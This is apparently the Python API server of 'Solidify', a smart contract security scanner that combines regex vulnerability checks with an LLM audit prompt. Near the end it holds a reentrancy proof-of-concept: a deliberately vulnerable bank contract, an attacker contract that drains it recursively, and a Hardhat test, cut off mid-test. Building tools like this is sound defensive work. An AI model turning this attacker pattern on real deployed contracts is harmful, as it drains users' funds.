import asyncio
import uuid
import os
import re
import json
import logging
import time
import html
from collections import defaultdict
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List
from contextlib import asynccontextmanager

import aiohttp
from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException, Body, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, PlainTextResponse
from pydantic import BaseModel, field_validator

load_dotenv()

DEFAULT_MODEL = os.getenv("SOLIDIFY_MODEL", "google/gemma-3-27b-it")
DEFAULT_PROVIDER = os.getenv("SOLIDIFY_PROVIDER", "nvidia")
NVIDIA_API_KEY = os.getenv("NVIDIA_API_KEY", "")
NVIDIA_BASE_URL = os.getenv("NVIDIA_BASE_URL", "https://integrate.api.nvidia.com")
OPENAI_API_KEY = os.getenv("OPENAI_API_KEY", "")
ANTHROPIC_API_KEY = os.getenv("ANTHROPIC_API_KEY", "")
ETHERSCAN_API_KEY = os.getenv("ETHERSCAN_API_KEY", "YourApiKeyToken")

MAX_CODE_SIZE = 100_000
MAX_CONCURRENT_TASKS = 20
TASK_TTL = timedelta(hours=1)
RATE_LIMIT_WINDOW = 60
RATE_LIMIT_MAX = 30

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger(__name__)

audit_tasks: Dict[str, Dict[str, Any]] = {}
rate_limits: Dict[str, list] = defaultdict(list)
active_task_count = 0
task_cleanup_running = False
cancelled_tasks = set()
paused_tasks = set()

CHAINS = {
    "ethereum": {"id": "ethereum", "name": "Ethereum", "chain_id": 1, "explorer": "etherscan.io", "api": "api.etherscan.io"},
    "bsc": {"id": "bsc", "name": "BNB Chain", "chain_id": 56, "explorer": "bscscan.com", "api": "api.bscscan.com"},
    "polygon": {"id": "polygon", "name": "Polygon", "chain_id": 137, "explorer": "polygonscan.com", "api": "api.polygonscan.com"},
    "arbitrum": {"id": "arbitrum", "name": "Arbitrum", "chain_id": 42161, "explorer": "arbiscan.io", "api": "api.arbiscan.io"},
    "optimism": {"id": "optimism", "name": "Optimism", "chain_id": 10, "explorer": "optimistic.etherscan.io", "api": "api-optimistic.etherscan.io"},
}
VALID_CHAIN_IDS = set(CHAINS.keys())


def sanitize_code(code: str) -> str:
    code = code.replace("\x00", "")
    code = "".join(c for c in code if c >= " " or c in "\n\r\t")
    return code[:MAX_CODE_SIZE]


def sanitize_error(msg: str) -> str:
    sanitized = html.escape(str(msg))
    secrets = [NVIDIA_API_KEY, OPENAI_API_KEY, ANTHROPIC_API_KEY, ETHERSCAN_API_KEY]
    for secret in secrets:
        if secret and len(secret) > 8:
            sanitized = sanitized.replace(secret, secret[:4] + "****" + secret[-4:])
    if len(sanitized) > 500:
        sanitized = sanitized[:500] + "..."
    return sanitized


def check_rate_limit(request: Request):
    client_ip = request.client.host if request.client else "unknown"
    now = time.time()
    window_start = now - RATE_LIMIT_WINDOW
    rate_limits[client_ip] = [t for t in rate_limits[client_ip] if t > window_start]
    if len(rate_limits[client_ip]) >= RATE_LIMIT_MAX:
        raise HTTPException(status_code=429, detail="Rate limit exceeded. Try again later.")
    rate_limits[client_ip].append(now)


async def cleanup_old_tasks():
    global task_cleanup_running
    if task_cleanup_running:
        return
    task_cleanup_running = True
    try:
        while True:
            now = datetime.now()
            expired = [tid for tid, task in audit_tasks.items()
                       if task.get("created_at") and now - task["created_at"] > TASK_TTL]
            for tid in expired:
                del audit_tasks[tid]
            if expired:
                logger.info(f"Cleaned up {len(expired)} expired tasks")
            await asyncio.sleep(300)
    finally:
        task_cleanup_running = False


@asynccontextmanager
async def lifespan(app: FastAPI):
    cleanup_task = asyncio.create_task(cleanup_old_tasks())
    logger.info("Solidify API server started")
    yield
    cleanup_task.cancel()
    logger.info("Solidify API server shutting down")


app = FastAPI(title="Solidify API", version="1.0.0", lifespan=lifespan)

cors_origins_raw = os.getenv("CORS_ORIGINS", "http://localhost:5173,http://localhost:3000,http://127.0.0.1:5173")
cors_origins = cors_origins_raw.split(",") if cors_origins_raw != "*" else ["*"]
app.add_middleware(
    CORSMiddleware,
    allow_origins=cors_origins,
    allow_methods=["GET", "POST", "OPTIONS"],
    allow_headers=["Content-Type", "Accept"],
    max_age=600,
)


class AuditRequest(BaseModel):
    code: Optional[str] = None
    address: Optional[str] = None
    chain: str = "ethereum"
    provider: Optional[str] = None
    model: Optional[str] = None
    command: str = "audit"

    @field_validator("chain")
    @classmethod
    def validate_chain(cls, v):
        if v and v not in VALID_CHAIN_IDS:
            raise ValueError(f"Unsupported chain: {v}. Supported: {', '.join(sorted(VALID_CHAIN_IDS))}")
        return v

    @field_validator("code")
    @classmethod
    def validate_code(cls, v):
        if v and len(v) > MAX_CODE_SIZE:
            raise ValueError(f"Code exceeds {MAX_CODE_SIZE} byte limit")
        return v

    @field_validator("address")
    @classmethod
    def validate_address(cls, v):
        if v and not re.match(r"^0x[a-fA-F0-9]{40}$", v):
            raise ValueError("Invalid contract address format")
        return v


class ChatRequest(BaseModel):
    message: str
    provider: Optional[str] = None
    model: Optional[str] = None
    history: Optional[List[Dict[str, str]]] = []

    @field_validator("message")
    @classmethod
    def validate_message(cls, v):
        if v and len(v) > 5000:
            raise ValueError("Message too long (max 5000 chars)")
        return v


async def fetch_contract_source(address: str, chain: str) -> Optional[str]:
    chain_config = CHAINS.get(chain, CHAINS["ethereum"])
    api_url = f"https://{chain_config['api']}/api"
    params = {"module": "contract", "action": "getsourcecode", "address": address, "apikey": ETHERSCAN_API_KEY}
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params=params) as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get("status") == "1" and data.get("result"):
                        source = data["result"][0].get("SourceCode", "")
                        if source:
                            return source
    except asyncio.TimeoutError:
        logger.warning(f"Etherscan timeout for {address}")
    except Exception as e:
        logger.error(f"Etherscan error for {address}: {sanitize_error(e)}")
    return None


VULNERABILITY_PATTERNS = [
    {"id": "REENTRANCY", "name": "Reentrancy Vulnerability", "severity": "CRITICAL", "cvss": 9.1,
     "check": lambda c: (".call(" in c or ".call{" in c or ".send(" in c) and ("value" in c or ".send(" in c) and "ReentrancyGuard" not in c and "checks-effects" not in c.lower() and "nonReentrant" not in c and "mutex" not in c.lower(),
     "desc": "External call without reentrancy guard allows recursive draining of contract balance", "fix": "Apply checks-effects-interactions pattern: update state before external call. Or use OpenZeppelin ReentrancyGuard modifier."},
    {"id": "ACCESS_CONTROL", "name": "Missing Access Control", "severity": "CRITICAL", "cvss": 9.0,
     "check": lambda c: ("withdraw" in c or "transfer" in c or "mint" in c or "burn" in c or "destroy" in c or "pause" in c or "emergency" in c) and "only" not in c.lower() and "require(msg.sender" not in c and "modifier" not in c.lower() and "auth" not in c.lower(),
     "desc": "Critical function without access control — any user can invoke privileged operations", "fix": "Add require(msg.sender == owner) guard or use OpenZeppelin's Ownable/AccessControl"},
    {"id": "INTEGER_OVERFLOW", "name": "Integer Overflow/Underflow", "severity": "HIGH", "cvss": 7.8,
     "check": lambda c: ("+" in c or "-" in c or "*" in c) and "unchecked" not in c.lower() and ("^0.7" in c or "^0.6" in c or "^0.5" in c) and "SafeMath" not in c and "using SafeMath" not in c.lower(),
     "desc": "Arithmetic operations before Solidity 0.8 without SafeMath — can overflow/underflow", "fix": "Use OpenZeppelin SafeMath library or upgrade to Solidity ^0.8.0 which has built-in overflow checks"},
    {"id": "TX_ORIGIN", "name": "tx.origin Vulnerability", "severity": "MEDIUM", "cvss": 5.3,
     "check": lambda c: "tx.origin" in c, "desc": "Using tx.origin for authorization allows phishing attacks via intermediary contract", "fix": "Use msg.sender instead of tx.origin for authentication"},
    {"id": "UNCHECKED_CALL", "name": "Unchecked External Call", "severity": "HIGH", "cvss": 7.5,
     "check": lambda c: (".call(" in c or ".call{" in c) and "require(" not in c and ("if(" not in c or ".call(" not in c[c.find("if("):c.find(")")+1]) and "bool" not in c.lower().split(".call")[0][-10:] and "success" not in c.lower().split(".call")[0][-10:],
     "desc": "External call return value not checked — failure silently succeeds", "fix": "Always check return value: (bool success, ) = addr.call{value: x}(''); require(success);"},
    {"id": "TIMESTAMP_DEP", "name": "Timestamp Dependence", "severity": "MEDIUM", "cvss": 4.8,
     "check": lambda c: ("now" in c or "block.timestamp" in c) and ("lottery" in c or "draw" in c or "random" in c or "winner" in c or "coinflip" in c or "roll" in c),
     "desc": "Using block.timestamp for randomness or critical logic — miners can manipulate timestamps", "fix": "Use block.number + commit-reveal scheme or Chainlink VRF for randomness"},
    {"id": "CONSTANT_PRAGMA", "name": "Floating Pragma", "severity": "INFO", "cvss": 0.5,
     "check": lambda c: bool(re.search(r"pragma\s+solidity\s+\^", c)),
     "desc": "Floating pragma allows compiling with unexpected compiler versions", "fix": "Lock pragma to exact version e.g. pragma solidity 0.8.19"},
    {"id": "MISSING_ZERO_CHECK", "name": "Missing Zero Address Check", "severity": "MEDIUM", "cvss": 5.5,
     "check": lambda c: bool(re.search(r"constructor\s*\([^)]*address", c)) and "require" not in c and "revert" not in c and "assert" not in c,
     "desc": "Constructor accepts address parameter without zero-address validation — tokens can be permanently locked", "fix": "Add require(addr != address(0)) for each address parameter"},
    {"id": "GAS_LIMIT_LOOP", "name": "Unbounded Loop", "severity": "MEDIUM", "cvss": 4.8,
     "check": lambda c: bool(re.search(r"for\s*\(.*\.\s*length", c)) and "gasleft()" not in c.lower() and "limit" not in c.lower().split("for")[-1][:200],
     "desc": "Unbounded loop over dynamic array could exceed block gas limit", "fix": "Check gasleft() inside loop or limit iteration count"},
    {"id": "UNPROTECTED_INIT", "name": "Unprotected Initializer", "severity": "CRITICAL", "cvss": 9.0,
     "check": lambda c: bool(re.search(r"function\s+initialize\s*\(", c)) and "initializer" not in c.lower() and "onlyOwner" not in c and "onlyRole" not in c and "require(msg.sender" not in c.lower(),
     "desc": "initialize() without access control — anyone can re-initialize and take over proxy contract", "fix": "Add OpenZeppelin's initializer modifier or onlyOwner guard"},
    {"id": "HARDCODED_ADDRESS", "name": "Hardcoded Address", "severity": "INFO", "cvss": 2.5,
     "check": lambda c: bool(re.search(r"0x[a-fA-F0-9]{40}", c)) and "address" in c.lower() and "require" not in c,
     "desc": "Hardcoded address in contract source reduces flexibility", "fix": "Make address configurable via constructor or setter function"},
    {"id": "DEPRECATED_NOW", "name": "Deprecated `now` Usage", "severity": "INFO", "cvss": 1.0,
     "check": lambda c: " now " in c or c.startswith("now") or "now;" in c or "now," in c,
     "desc": "Using deprecated `now` keyword (removed in Solidity 0.7)", "fix": "Use block.timestamp instead"},
    {"id": "FRONT_RUNNABLE", "name": "Front-Runnable Transaction", "severity": "MEDIUM", "cvss": 5.0,
     "check": lambda c: bool(re.search(r"function\s+\w+\s*\([^)]*\)\s*(public|external)\s", c)) and ("swap" in c.lower() or "buy" in c.lower() or "sell" in c.lower()),
     "desc": "Public/external swap function without commit-reveal — transactions can be front-run by MEV bots", "fix": "Use commit-reveal scheme or add minimum output amount parameter"},
    {"id": "PHISHABLE_WITHDRAW", "name": "Phishable Withdraw Pattern", "severity": "MEDIUM", "cvss": 5.5,
     "check": lambda c: bool(re.search(r"function\s+withdraw\w*\s*\([^)]*address", c)) and "require" not in c[c.find("withdraw"):c.find("withdraw")+200],
     "desc": "withdraw function takes a recipient address without authenticating it — attacker can trick owner into withdrawing to attacker address", "fix": "Remove recipient parameter or add explicit sender validation"},
    {"id": "ARRAY_PUSH_IN_LOOP", "name": "Array Push Inside Loop", "severity": "LOW", "cvss": 3.5,
     "check": lambda c: bool(re.search(r"for\s*\(.*\{[^}]*\.push\(", c)) or bool(re.search(r"\.push\([^)]*\)\s*;\s*\}", c)),
     "desc": "Appending to dynamic array inside loop — unbounded gas consumption", "fix": "Use fixed-size array or track with mappings"},
    {"id": "EXTERNAL_MINT", "name": "Public/External Mint Without Rate Limit", "severity": "HIGH", "cvss": 7.0,
     "check": lambda c: bool(re.search(r"function\s+mint\s*\(", c)) and "only" not in c.lower() and "require(msg.sender" not in c.lower() and "max" not in c.lower()[:c.lower().find("mint")+300],
     "desc": "Public mint function without supply cap or rate limit — infinite mint possible", "fix": "Add max supply check, onlyOwner guard, or per-user cap"},
    {"id": "SELFDESTRUCT_ANYONE", "name": "Selfdestruct Callable by Anyone", "severity": "CRITICAL", "cvss": 9.5,
     "check": lambda c: bool(re.search(r"selfdestruct\(|suicide\(", c)) and "only" not in c.lower()[:c.lower().find("selfdestruct")+200] and "require(msg.sender" not in c.lower()[:c.lower().find("selfdestruct")+200],
     "desc": "selfdestruct is callable by anyone — contract can be killed by attacker", "fix": "Add onlyOwner modifier or require(msg.sender == owner) on selfdestruct call"},
    {"id": "DELEGATECALL_LOOP", "name": "Delegatecall With Dynamic Target", "severity": "HIGH", "cvss": 8.5,
     "check": lambda c: bool(re.search(r"\.delegatecall\(", c)) and bool(re.search(r"delegatecall\(\s*\w+\s*,", c)),
     "desc": "delegatecall with dynamic target argument — arbitrary code execution in proxy context", "fix": "Hardcode delegatecall target or use whitelist of trusted addresses"},
    {"id": "CENTRALIZATION_OWNER", "name": "Centralization Risk", "severity": "INFO", "cvss": 2.0,
     "check": lambda c: bool(re.search(r"onlyOwner|onlyRole|require\s*\(\s*msg\.sender\s*==\s*owner", c)),
     "desc": "Single owner/admin has elevated privileges — trust assumption", "fix": "Consider multi-sig, timelock, or DAO governance for privileged functions"},
]


def parse_solidity(code: str) -> Dict[str, Any]:
    vulns = []
    lines = code.split("\n")
    code_lower = code.lower()
    seen_ids = set()

    for vuln in VULNERABILITY_PATTERNS:
        try:
            if vuln["id"] in seen_ids:
                continue
            matches = [f"Line {i}" for i, line in enumerate(lines, 1) if vuln["check"](line)]
            if matches:
                location = ", ".join(matches[:3])
                if len(matches) > 3:
                    location += f" (+{len(matches) - 3} more)"
                vulns.append({"type": vuln["name"], "severity": vuln["severity"], "location": location,
                               "description": vuln["desc"], "recommendation": vuln["fix"], "cvss": vuln["cvss"]})
                seen_ids.add(vuln["id"])
        except Exception:
            continue

    # Additional standalone checks for patterns not easily captured by line-level regex
    if "delegatecall(" in code_lower:
        dynamic_target = bool(re.search(r"delegatecall\(\s*\w+\s*,", code))
        if dynamic_target and "DELEGATECALL_LOOP" not in seen_ids:
            seen_ids.add("DELEGATECALL_LOOP")
            locations = [f"Line {i}" for i, line in enumerate(lines, 1) if "delegatecall" in line.lower()]
            vulns.append({"type": "Unsafe Delegatecall With Dynamic Target", "severity": "HIGH",
                           "location": ", ".join(locations[:3]), "cvss": 8.5,
                           "description": "delegatecall with variable/dynamic target — arbitrary code execution in proxy context",
                           "recommendation": "Hardcode delegatecall target or use whitelist of trusted library addresses"})

    score = max(0, round(10.0 - sum(
        3.0 if v["severity"] == "CRITICAL" else 2.0 if v["severity"] == "HIGH" else 1.0 if v["severity"] == "MEDIUM" else 0.5
        for v in vulns if v["severity"] in ("CRITICAL", "HIGH", "MEDIUM", "LOW")
    ), 1))

    critical = sum(1 for v in vulns if v["severity"] == "CRITICAL")
    high = sum(1 for v in vulns if v["severity"] == "HIGH")
    if critical or high:
        summary = f"Found {len(vulns)} vulnerabilities. {critical} CRITICAL, {high} HIGH require attention."
    else:
        summary = f"Found {len(vulns)} vulnerabilities. Review each item below."

    return {"score": score, "vulnerabilities": vulns, "summary": summary,
            "stats": {"critical": critical, "high": high,
                       "medium": sum(1 for v in vulns if v["severity"] == "MEDIUM"),
                       "low": sum(1 for v in vulns if v["severity"] == "LOW")}}


@app.middleware("http")
async def rate_limit_middleware(request: Request, call_next):
    if request.url.path.startswith("/api/") and request.method == "POST":
        try:
            check_rate_limit(request)
        except HTTPException:
            return PlainTextResponse("Rate limit exceeded", status_code=429)
    return await call_next(request)


@app.get("/api/chains")
async def get_chains():
    return list(CHAINS.values())


@app.post("/api/chat")
async def chat(request: ChatRequest):
    start = time.time()
    try:
        from providers.provider_factory import create_provider

        provider_name = request.provider or DEFAULT_PROVIDER
        model_name = request.model or DEFAULT_MODEL

        history_text = "".join(f"{m.get('role', 'user')}: {m.get('content', '')}\n" for m in (request.history or [])[-5:])
        prompt = f"""You are Solidify, a smart contract security expert. Answer concisely and technically.

{history_text}
user: {request.message}

expert:"""

        provider = create_provider(provider_name, model=model_name)
        if not provider:
            logger.warning(f"Chat: provider {provider_name} unavailable")
            return {"message": "AI provider not available. Check API key configuration.", "role": "assistant"}

        response = await provider.generate(prompt)
        content = response.content if hasattr(response, "content") else str(response)
        logger.info(f"Chat OK ({time.time() - start:.1f}s)")
        return {"message": content, "role": "assistant"}

    except Exception as e:
        logger.error(f"Chat error: {sanitize_error(e)}")
        return {"message": "Sorry, I encountered an error.", "error": sanitize_error(e)}


@app.post("/api/audit/start")
async def start_audit(request: AuditRequest, req: Request):
    global active_task_count

    if active_task_count >= MAX_CONCURRENT_TASKS:
        raise HTTPException(status_code=503, detail="Server busy. Try again later.")

    task_id = str(uuid.uuid4())[:8]

    code = request.code
    if request.address:
        code = await fetch_contract_source(request.address, request.chain)
        if not code:
            raise HTTPException(status_code=404, detail="Contract not found or not verified on explorer")

    if not code:
        raise HTTPException(status_code=400, detail="Code or address required")

    code = sanitize_code(code)

    audit_tasks[task_id] = {
        "task_id": task_id,
        "code": code,
        "chain": request.chain,
        "provider": request.provider or DEFAULT_PROVIDER,
        "model": request.model or DEFAULT_MODEL,
        "status": "queued",
        "progress": 0,
        "result": None,
        "events": [],
        "created_at": datetime.now(),
    }

    active_task_count += 1
    asyncio.create_task(_run_audit(task_id))
    logger.info(f"Task {task_id} started (active: {active_task_count})")
    return {"task_id": task_id, "status": "started"}


async def _run_audit(task_id: str):
    global active_task_count
    task = audit_tasks[task_id]
    code = task["code"]

    if task_id in cancelled_tasks:
        return

    try:
        _push_event(task, "queued", 5)
        await asyncio.sleep(0.2)

        from providers.provider_factory import create_provider

        _push_event(task, "connecting", 10)
        await asyncio.sleep(0.1)

        provider_instance = None
        try:
            provider_instance = create_provider(task["provider"], model=task.get("model", DEFAULT_MODEL))
        except Exception:
            pass

        if provider_instance:
            _push_event(task, "analyzing", 30)
            prompt = f"""You are Solidify, an expert Solidity security auditor. Thoroughly analyze this {task['chain']} smart contract code.

```solidity
{code}
```

Check for ALL of these vulnerability classes. Be comprehensive — don't skip any:
1. **Reentrancy** — external call before state change (checks-effects-interactions violation)
2. **Access Control** — critical functions (withdraw, mint, burn, pause, destroy) without onlyOwner/require
3. **Integer Overflow/Underflow** — unchecked arithmetic in solc <0.8 without SafeMath
4. **Unchecked External Calls** — .call()/.delegatecall() return value not checked
5. **tx.origin** — using tx.origin for auth (phishing vulnerable)
6. **Flash Loan Attacks** — price oracle manipulation, insufficient liquidity checks
7. **Oracle Manipulation** — using spot price without TWAP or multiple data sources
8. **Front-Running** — unprotected MEV-vulnerable tx ordering (swap/buy/sell without slippage protection)
9. **Selfdestruct/Suicide** — anyone can kill the contract
10. **Unsafe Delegatecall** — delegatecall to dynamic/user-controlled address
11. **Weak Randomness** — predictable RNG (blockhash, timestamp, block.difficulty)
12. **Unprotected Initializer** — initialize() without initializer modifier (proxy takeover)
13. **Missing Zero-Address Checks** — constructor/setter accepts address param without require(addr != address(0))
14. **Centralization Risk** — single owner with critical power (multi-sig/timelock recommended)
15. **Unbounded Loops** — loops over dynamic arrays without gas limit check
16. **Public Mint Without Cap** — mint function without max supply or per-user limit
17. **Phishable Withdraw** — withdraw(address recipient) without authenticating recipient
18. **Deprecated Features** — tx.gasprice, suicide, block.blockhash usage
19. **Reentrancy in Transfer** — using transfer()/send() with state changes after
20. **Front-runable Approve** — no check for current approval in ERC20-like approve()

Examine EVERY function. Look at modifier usage, require() guards, state change order, external calls.

Return ONLY valid JSON — no markdown formatting, no backticks, no explanation text.
Severity must be exactly one of: CRITICAL, HIGH, MEDIUM, LOW, INFO (uppercase).
Score is 0-10 where 10 = perfectly secure, 0 = critically vulnerable with multiple severe issues.

Example:
{{"score": 3.5, "vulnerabilities": [{{"type": "Reentrancy", "severity": "CRITICAL", "location": "withdraw() at line 42", "description": "External ETH call before state update enables recursive draining of contract balance", "recommendation": "Move balances[msg.sender] -= amount before the external call; add ReentrancyGuard", "cvss": 9.1}}], "summary": "Multiple critical vulnerabilities expose user funds to theft."}}

Analyze the contract above. Return ONLY the JSON object:"""

            full_response = ""
            try:
                async for chunk in provider_instance.generate_stream(prompt):
                    if task_id in cancelled_tasks:
                        logger.info(f"Task {task_id}: cancelled during stream")
                        return
                    while task_id in paused_tasks:
                        await asyncio.sleep(0.5)
                        if task_id in cancelled_tasks:
                            return
                    chunk_str = chunk if isinstance(chunk, str) else chunk.decode()
                    if chunk_str.startswith("[") and "Error:" in chunk_str:
                        _push_chunk(task, f"\n⚠ {chunk_str}\n")
                        continue
                    full_response += chunk_str
                    _push_chunk(task, chunk_str)
            except asyncio.TimeoutError:
                msg = f"\n⚠ AI streaming timed out after 30s. Falling back to static analysis.\n"
                _push_chunk(task, msg)
                logger.warning(f"Task {task_id}: AI streaming timed out, falling back to scanner")
            except Exception as e:
                msg = f"\n⚠ AI provider error: {sanitize_error(str(e)[:120])}. Falling back to static analysis.\n"
                _push_chunk(task, msg)
                logger.warning(f"Task {task_id}: AI error ({sanitize_error(e)}), falling back to scanner")

            try:
                start_idx = full_response.find("{")
                end_idx = full_response.rfind("}") + 1
                if start_idx >= 0 and end_idx > start_idx:
                    raw_json = full_response[start_idx:end_idx]
                    result = json.loads(raw_json)
                else:
                    result = parse_solidity(code)
            except (json.JSONDecodeError, ValueError):
                logger.warning("AI returned malformed JSON, falling back to static analysis")
                result = parse_solidity(code)
            else:
                result = _validate_report(result)

            # If AI returned very few findings or nothing useful, supplement with static scan
            static = parse_solidity(code)
            existing = set(v.get("type", "").lower() for v in result.get("vulnerabilities", []))
            for sv in static.get("vulnerabilities", []):
                if sv["type"].lower() not in existing and sv["severity"] in ("CRITICAL", "HIGH"):
                    result.setdefault("vulnerabilities", []).append(sv)
                    result["score"] = max(0, result.get("score", 5) - 2.0)
                    if sv["severity"] == "CRITICAL":
                        result["score"] = max(0, result["score"] - 1.0)
            result["score"] = round(min(10, max(0, result.get("score", 5))), 1)
            crit = sum(1 for v in result.get("vulnerabilities", []) if v["severity"] == "CRITICAL")
            high = sum(1 for v in result.get("vulnerabilities", []) if v["severity"] == "HIGH")
            if crit or high:
                result["summary"] = f"Found {len(result.get('vulnerabilities', []))} vulnerabilities. {crit} CRITICAL, {high} HIGH require attention."
            else:
                result["summary"] = f"Found {len(result.get('vulnerabilities', []))} vulnerabilities. Review each item below."
            result["stats"] = {
                "critical": crit,
                "high": high,
                "medium": sum(1 for v in result.get("vulnerabilities", []) if v["severity"] == "MEDIUM"),
                "low": sum(1 for v in result.get("vulnerabilities", []) if v["severity"] == "LOW"),
            }
        else:
            _push_event(task, "scanning", 50)
            await asyncio.sleep(0.5)
            result = parse_solidity(code)

        _complete_task(task, result)
        logger.info(f"Task {task_id} completed: score={result.get('score')}, vulns={len(result.get('vulnerabilities', []))}")

    except Exception as e:
        logger.error(f"Task {task_id} failed: {sanitize_error(e)}")
        _complete_task(task, parse_solidity(code))
    finally:
        active_task_count = max(0, active_task_count - 1)


def _validate_report(result: dict) -> dict:
    if not isinstance(result.get("score"), (int, float)):
        result["score"] = 5
    if not isinstance(result.get("vulnerabilities"), list):
        result["vulnerabilities"] = []
    for v in result["vulnerabilities"]:
        if not isinstance(v.get("type"), str):
            v["type"] = "Unknown"
        t = v["type"].lower()
        sev = v.get("severity", "").upper()
        # Overrule AI severity for known critical/high vuln types
        if any(kw in t for kw in ("reentrancy", "access control", "selfdestruct", "suicide", "initializer", "unprotected init")):
            sev = "CRITICAL"
        elif any(kw in t for kw in ("overflow", "underflow", "unchecked call", "delegatecall", "flash loan", "oracle", "weak random", "unbounded loop", "external mint", "phishable")):
            sev = max(sev, "HIGH", key=lambda x: {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}.get(x, 0))
        if sev not in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
            sev = "INFO"
        v["severity"] = sev
        if not isinstance(v.get("description"), str):
            v["description"] = ""
        if not isinstance(v.get("recommendation"), str):
            v["recommendation"] = ""
    return result


def _push_event(task: dict, status: str, progress: int):
    task["status"] = status
    task["progress"] = progress
    task["events"].append({"status": status, "progress": progress})


def _push_chunk(task: dict, chunk: str):
    task["status"] = "streaming"
    task["events"].append({"status": "streaming", "chunk": chunk})


def _complete_task(task: dict, result: dict):
    task["status"] = "completed"
    task["progress"] = 100
    task["result"] = result
    task["events"].append({"status": "completed", "progress": 100, "result": result})


@app.get("/api/audit/stream/{task_id}")
async def stream_audit(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")

    async def event_generator():
        task = audit_tasks[task_id]
        seen = 0
        while True:
            while seen < len(task["events"]):
                event = task["events"][seen]
                seen += 1
                yield f"data: {json.dumps(event)}\n\n"
                if event.get("status") in ("completed", "cancelled", "failed"):
                    return
            if task["status"] == "failed":
                yield f"data: {json.dumps({'status': 'failed', 'error': 'Audit processing failed'})}\n\n"
                return
            if task_id in cancelled_tasks:
                yield f"data: {json.dumps({'status': 'cancelled'})}\n\n"
                return
            await asyncio.sleep(0.2)

    return StreamingResponse(event_generator(), media_type="text/event-stream")


@app.post("/api/audit/stop/{task_id}")
async def stop_audit(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    cancelled_tasks.add(task_id)
    paused_tasks.discard(task_id)
    audit_tasks[task_id]["status"] = "cancelled"
    audit_tasks[task_id]["events"].append({"status": "cancelled", "progress": 0})
    logger.info(f"Task {task_id} cancelled by user")
    return {"task_id": task_id, "status": "cancelled"}


@app.post("/api/audit/pause/{task_id}")
async def pause_audit(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    if audit_tasks[task_id]["status"] in ("completed", "cancelled", "failed"):
        raise HTTPException(status_code=400, detail="Task already finished")
    paused_tasks.add(task_id)
    audit_tasks[task_id]["status"] = "paused"
    audit_tasks[task_id]["events"].append({"status": "paused", "progress": audit_tasks[task_id].get("progress", 0)})
    logger.info(f"Task {task_id} paused by user")
    return {"task_id": task_id, "status": "paused"}


@app.post("/api/audit/resume/{task_id}")
async def resume_audit(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    if audit_tasks[task_id]["status"] != "paused":
        raise HTTPException(status_code=400, detail="Task is not paused")
    paused_tasks.discard(task_id)
    audit_tasks[task_id]["status"] = "queued"
    audit_tasks[task_id]["events"].append({"status": "resumed", "progress": audit_tasks[task_id].get("progress", 0)})
    logger.info(f"Task {task_id} resumed by user")
    return {"task_id": task_id, "status": "resumed"}


@app.get("/api/audit/status/{task_id}")
async def get_status(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    return {"task_id": task_id, "status": task["status"], "progress": task.get("progress", 0)}


@app.get("/api/audit/report/{task_id}")
async def get_report(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task["status"] != "completed":
        return {"status": task["status"], "progress": task.get("progress", 0)}
    return task.get("result", {})


def generate_markdown_report(result: dict) -> str:
    lines = ["# Solidify Security Audit Report\n",
             f"## Summary\n- **Security Score**: {result.get('score', 'N/A')}/10\n- **Vulnerabilities Found**: {len(result.get('vulnerabilities', []))}\n",
             f"{result.get('summary', '')}\n---\n"]
    for v in result.get("vulnerabilities", []):
        lines.append(f"\n### [{v.get('severity', 'INFO')}] {v.get('type', 'Unknown')}\n- **Location**: `{v.get('location', 'N/A')}`\n- **CVSS**: {v.get('cvss', 'N/A')}\n- **Description**: {v.get('description', '')}\n")
        if v.get("recommendation"):
            lines.append(f"- **Recommendation**: {v.get('recommendation')}\n")
        if v.get("patch"):
            lines.append(f"**Secure Patch:**\n```solidity\n{v.get('patch')}\n```\n")
    return "".join(lines)


POC_TEMPLATES = {
    "reentrancy": {
        "contract": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// VULNERABLE CONTRACT — for PoC testing only
contract VulnerableBank {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw(uint _amount) external {
        require(balances[msg.sender] >= _amount);
        (bool ok,) = msg.sender.call{value: _amount}("");
        require(ok);
        balances[msg.sender] -= _amount; // state after call — REENTRANCY
    }
    function getBalance() external view returns (uint) { return address(this).balance; }
}
contract ReentrancyAttacker {
    address payable victim;
    uint public count;
    constructor(address _victim) payable { victim = payable(_victim); }
    function attack() external {
        victim.call{value: 1 ether}("");
        (bool ok,) = victim.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
        require(ok);
    }
    receive() external payable {
        count++;
        if (count < 5) {
            (bool ok,) = victim.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
            require(ok);
        }
    }
}""",
        "test": """const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Reentrancy PoC", function () {
  it("should drain the contract via reentrancy", async function () {
    const [owner, attacker] = await ethers.getSigners();
    const Bank = await ethers.getContractFactory("VulnerableBank");
    const bank = await Bank.deploy();
    await bank.waitForDeployment();
    const bankAddr = await bank.getAddress();

    // Fund the bank
    await owner.sendTransaction({ to: bankAddr, value: ethers.parseEther("10") });

    const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
    const hack = await Attacker.deploy(bankAddr, { value: ethers.parseEther("1") });
    await hack.waitForDeployment();

    const before = await ethers.provider.getBalance(bankAddr);
    await hack.connect(attacker).attack();
    const after = await ethers.provider.getBalance(bankAddr);

